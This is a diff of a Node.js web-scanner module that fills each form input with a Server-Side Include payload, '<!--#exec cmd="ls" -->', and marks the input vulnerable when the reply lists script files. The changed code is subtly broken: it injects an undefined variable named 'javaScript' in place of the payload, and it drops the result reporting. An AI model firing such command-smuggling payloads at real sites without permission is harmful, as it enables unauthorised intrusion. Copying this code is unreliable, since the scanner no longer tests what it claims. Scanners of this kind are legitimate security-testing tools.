@@ -6,105 +6,118 @@
 	can be executed on a form
 */
 var Url = require("url");
-var request = require('sync-request');
+var request = require('request');
 var cheerio = require("cheerio");
-var utilities = require("../utilities/");
 module.exports = {
 	run: function (url) {
 		var injectableForms = [];
-		var SSI = '<!--#exec cmd="ls ../"-->';
 
 		// Parsing the url and the queryString arguments
 		var urlObject = Url.parse(url, true);
 
 		// Get correspondent page		
-		var res = request('GET', urlObject.format());
-		var $;
-		if (res.statusCode === 200) {
-			// Get all forms in page via CSS selector powered by Cheerio
-			$ = cheerio.load(res.getBody().toString());
-			var forms = $("form");
+		request.get(urlObject.format(), function (err,httpResponse,body) {
+			var $;
+			if (httpResponse.statusCode == 200) {
+				// Get all forms in page via CSS selector powered by Cheerio
+				$ = cheerio.load(body);
+				var forms = $("form");
 
-			// Iterate through all forms and test them individually
-			forms.each(function (index, form) {
-				var action = $(this).attr("action");
-				var method = $(this).attr("method");
-				var inputs = $(this).children(":input");
-				var actionUrlObject = Url.resolve(urlObject.format(), action);
+				// Iterate through all forms and test them individually
+				forms.each(function (index, form) {
+					var action = $(this).attr("action");
+					var method = $(this).attr("method") || "GET";
+					var inputs = $(this).children(":input");
+					var actionUrlObject = Url.resolve(urlObject.format(), action);
+					// Iterate through all inputs and test them individually
+					var inputsArray = inputs.toArray();
+					inputsArray.forEach(function (index, testingInput) {
+						var testingInputName = $(inputsArray[testingInput]).attr("name");
+						var SSI = '<!--#exec cmd="ls" -->';
+						var form = {};
+						for(var input in inputsArray){
+							var inject = $(inputsArray[input]).attr("name") == testingInputName; 
+							form[$(inputsArray[input]).attr("name")] = (inject ? javaScript : ($(inputsArray[input]).val() == "" || $(inputsArray[input]).val() == undefined ? "default" : $(inputsArray[input]).val()));
+						}
 
-				// Iterate through all inputs and test them individually
-				var inputsArray = inputs.toArray();
-				for (var testingInput in inputsArray) {
-					// Construct Request Body (form-data)
-					var formBody = "";
-					for (var input in inputsArray) {
-						var prependAmpersand = (formBody.length !== 0);
-						var inject = $(inputsArray[input]).attr("name") === $(inputsArray[testingInput]).attr("name");
-						formBody += (prependAmpersand ? "&" : "");
-						formBody += $(inputsArray[input]).attr("name") + "=" + (inject ? SSI : ($(inputsArray[input]).val() === "" || $(inputsArray[input]).val() === undefined ? "default" : $(inputsArray[input]).val()));
-					}
-					var res_form = request(method, urlObject.format(), {
-						headers: {
-							"Content-Type": "application/x-www-form-urlencoded"
-						},
-						body: formBody
+						if (method == "GET") {
+							var actionWithQuery = actionUrlObject + "?" + require('querystring').stringify(form);
+							request({
+								url: actionWithQuery
+							}, function (err, httpResponse, body) {
+								if (body.toLowerCase().indexOf(".php".toLowerCase()) > -1) {
+									if (!err) {
+										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
+									} else {
+										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
+									}
+								} else if (body.toLowerCase().indexOf(".py".toLowerCase()) > -1) {
+									if (!err) {
+										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
+									} else {
+										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
+									}
+								} else if (body.toLowerCase().indexOf(".pl".toLowerCase()) > -1) {
+									if (!err) {
+										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
+									} else {
+										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
+									}
+								} else if (body.toLowerCase().indexOf(".js".toLowerCase()) > -1) {
+									if (!err) {
+										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
+									} else {
+										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
+									}
+								} else if (body.toLowerCase().indexOf(".rb".toLowerCase()) > -1) {
+									if (!err) {
+										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
+									} else {
+										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
+									}
+								}
+							});
+						} else {
+							request.post({
+								url: actionUrlObject,
+								form: form
+							}, function (err, httpResponse, body) {
+								if (body.toLowerCase().indexOf(".php".toLowerCase()) > -1) {
+									if (!err) {
+										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
+									} else {
+										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
+									}
+								} else if (body.toLowerCase().indexOf(".py".toLowerCase()) > -1) {
+									if (!err) {
+										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
+									} else {
+										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
+									}
+								} else if (body.toLowerCase().indexOf(".pl".toLowerCase()) > -1) {
+									if (!err) {
+										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
+									} else {
+										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
+									}
+								} else if (body.toLowerCase().indexOf(".js".toLowerCase()) > -1) {
+									if (!err) {
+										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
+									} else {
+										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
+									}
+								} else if (body.toLowerCase().indexOf(".rb".toLowerCase()) > -1) {
+									if (!err) {
+										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
+									} else {
+										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
+									}
+								}
+							});
+						}
 					});
-
-					if (res_form.getBody().toString().toLowerCase().indexOf(".php".toLowerCase()) > -1) { //PHP SCRIPTS
-						// SSI vulnerability found
-						if (injectableForms[actionUrlObject] === undefined) {
-							injectableForms[actionUrlObject] = [];
-						}
-						injectableForms[actionUrlObject].push($(inputsArray[testingInput]).attr("name"));
-					} else if (res_form.getBody().toString().toLowerCase().indexOf(".py".toLowerCase()) > -1) { //PYTHON SCRIPTS
-						// SSI vulnerability found
-						if (injectableForms[actionUrlObject] === undefined) {
-							injectableForms[actionUrlObject] = [];
-						}
-						injectableForms[actionUrlObject].push($(inputsArray[testingInput]).attr("name"));
-					} else if (res_form.getBody().toString().toLowerCase().indexOf(".asp".toLowerCase()) > -1) { //AJAX SCRIPTS
-						// SSI vulnerability found
-						if (injectableForms[actionUrlObject] === undefined) {
-							injectableForms[actionUrlObject] = [];
-						}
-						injectableForms[actionUrlObject].push($(inputsArray[testingInput]).attr("name"));
-					} else if (res_form.getBody().toString().toLowerCase().indexOf(".js".toLowerCase()) > -1) { //JAVASCRIPT SCRIPTS
-						// SSI vulnerability found
-						if (injectableForms[actionUrlObject] === undefined) {
-							injectableForms[actionUrlObject] = [];
-						}
-						injectableForms[actionUrlObject].push($(inputsArray[testingInput]).attr("name"));
-					} else if (res_form.getBody().toString().toLowerCase().indexOf(".pl".toLowerCase()) > -1) { //PERL SCRIPTS
-						// SSI vulnerability found
-						if (injectableForms[actionUrlObject] === undefined) {
-							injectableForms[actionUrlObject] = [];
-						}
-						injectableForms[actionUrlObject].push($(inputsArray[testingInput]).attr("name"));
-					} else if (res_form.getBody().toString().toLowerCase().indexOf(".rb".toLowerCase()) > -1) { //RUBY SCRIPTS
-						// SSI vulnerability found
-						if (injectableForms[actionUrlObject] === undefined) {
-							injectableForms[actionUrlObject] = [];
-						}
-						injectableForms[actionUrlObject].push($(inputsArray[testingInput]).attr("name"));
-					}
-				}
-
-			});
-			// Produce result string
-			var resultString = "SSI Simple 'ls' command Module: ";
-			if (injectableForms.length === 0) {
-				resultString += "no vulnerable forms found on page.";
-			} else {
-				resultString += "\n";
+				});
 			}
-
-			injectableForms.forEach(function (index, form) {
-				resultString += "\tIn form which action is " + form + "\n";
-			});
-
-			return resultString;
-		} else {
-			return "SSI Simple 'ls' command Module: there was an error loading the page.";
-		}
+		});
 	}
 }
